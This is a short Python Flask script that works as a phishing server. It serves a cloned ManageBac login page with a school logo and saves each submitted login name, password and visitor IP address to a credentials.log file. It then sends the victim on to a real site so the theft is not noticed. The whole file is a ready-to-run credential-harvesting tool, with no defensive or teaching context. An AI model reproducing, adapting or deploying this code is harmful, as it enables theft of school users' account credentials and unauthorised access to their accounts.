from flask import Flask, render_template , request, send_file, redirect
from sys import argv

def log(email, password, ip , sitename):
    with open("credentials.log" , "a") as file:
        if not ip==None:
            file.write(f"{email} : {password} : {ip} : {sitename}\n")
        else:
            file.write(f"{email} : {password} : {sitename}\n")
app = Flask(__name__)
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
@app.route("/")
def aaaaads():
    return render_template("ManageBac _ Login.html")

@app.route("/ManageBac _ Login_files/login-b69a3ffed1511f764114aca157211120aeac6ca7e733f260caa6b929af01c9db.css")
def hassd():
    return send_file("templates/ManageBac _ Login_files/login-b69a3ffed1511f764114aca157211120aeac6ca7e733f260caa6b929af01c9db.css")


@app.route("/form" , methods=["POST"])
def ahsad():
    log(request.form.get("login")  , request.form.get("password") , request.headers.get("X-Forwarded-For"), sitename)
    
    return redirect(redirect_url)

@app.route("/ManageBac _ Login_files/GGS_Logo.png")
def ajasda():
    return send_file("templates/ManageBac _ Login_files/GGS_Logo.png")
app.run(host=host, port=port)